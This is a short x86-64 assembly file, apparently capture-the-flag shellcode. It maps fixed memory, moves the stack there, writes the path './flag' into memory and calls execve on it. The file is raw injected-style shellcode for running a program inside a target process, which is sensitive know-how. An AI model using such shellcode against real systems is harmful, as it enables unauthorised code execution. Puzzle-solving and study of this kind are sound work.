global _start

section .text
_start :

final:
	mov r10,0x122 
	mov r9,0
	mov r8,0xffffffffffffffff
	mov rdx,3
	mov rsi,0x2000
	mov rdi,0x11000
	mov rax,0x9
	syscall
	mov rsp,rax
    push rax
	mov rdi,0x10000
    mov DWORD [rdi],0x6c662f2e 
    add rdi,4
    mov DWORD [rdi],0x6761
    sub rdi,4
    mov rax,0x3b
    xor rsi,rsi
    xor rdx,rdx
	xor rcx,rcx
    syscall

	

